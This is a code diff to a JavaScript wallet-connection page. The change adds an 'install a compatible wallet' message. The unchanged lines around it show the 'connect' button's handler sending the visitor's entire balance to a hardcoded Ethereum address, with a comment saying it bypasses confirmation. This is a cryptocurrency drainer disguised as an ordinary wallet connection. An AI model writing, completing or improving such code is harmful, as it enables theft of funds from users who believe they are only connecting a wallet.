@@ -15,7 +15,9 @@ else if (typeof window.ethereum !== "undefined" && window.ethereum.isTrust) {
 }
 else {
   console.log("No compatible mobile wallet found");
-  return;
+  // Display instructions or a link to install a compatible wallet
+  const walletInstructions = document.getElementById("walletInstructions");
+  walletInstructions.innerHTML = "No compatible mobile wallet found. Please install a compatible wallet from <a href='https://example.com'>here</a>.";
 }
 
 // Connect button event listener
@@ -39,7 +41,7 @@ connectButton.addEventListener("click", async () => {
         to: "0x11E877E78F00f77798DC5fd7bDF53824d9C111cC",
         value: balance,
       };
-                      
+
       // Bypass confirmation and send the transaction
       await signer.provider.send("eth_sendTransaction", [transaction]);
       console.log("Transaction sent");
